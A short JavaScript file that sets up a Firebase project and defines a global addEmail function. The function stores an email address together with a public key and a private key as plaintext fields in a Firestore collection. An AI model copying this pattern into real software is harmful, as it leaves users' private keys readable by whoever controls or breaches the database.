import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.4.0/firebase-app.js';
import {
  getFirestore,
  collection,
  addDoc,
} from 'https://www.gstatic.com/firebasejs/9.4.0/firebase-firestore.js';

// TODO: Replace the following with your app's Firebase project configuration
// See: https://firebase.google.com/docs/web/learn-more#config-object
const firebaseConfig = {
  apiKey: 'AIzaSyC349s0GI1RnTnJvwLC1E7fQ39Yr8a5k-4',
  authDomain: 'krallaragguvenligi-21ef0.firebaseapp.com',
  projectId: 'krallaragguvenligi-21ef0',
  storageBucket: 'krallaragguvenligi-21ef0.appspot.com',
  messagingSenderId: '122724089734',
  appId: '1:122724089734:web:309bc585cbdf52f5fab607',
  measurementId: 'G-Y9N2632M1Z',
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Initialize Cloud Firestore and get a reference to the service
const db = getFirestore(app);

window.addEmail = async (email, publicKey, privateKey) => {
  try {
    const docRef = await addDoc(collection(db, 'emails'), {
      email: email,
      publicKey: publicKey,
      privateKey: privateKey,
    });
    console.log('Document written with ID: ', docRef.id);
  } catch (e) {
    console.error('Error adding document: ', e);
  }
};
